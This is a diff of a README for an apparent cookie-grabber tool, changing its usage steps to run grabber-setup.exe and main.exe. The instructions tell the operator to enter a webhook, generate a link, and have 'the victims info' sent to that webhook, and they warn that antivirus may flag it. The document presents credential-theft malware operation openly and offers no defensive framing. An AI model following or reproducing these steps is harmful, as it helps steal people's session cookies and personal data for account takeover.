@@ -16,7 +16,7 @@ And becuase of the nature of this device, It may be flagged by your antivirus. I
 # Instructions
 
 How to use 
-1. Run grabber-setup.exe 
+1. Run grabber-setup.exe and main.exe 
 2. Put in the webhook from the channel you want to receive cookies from.
 
 Now it will return a link that you can copy paste and the victims info will be sent to that webhook.
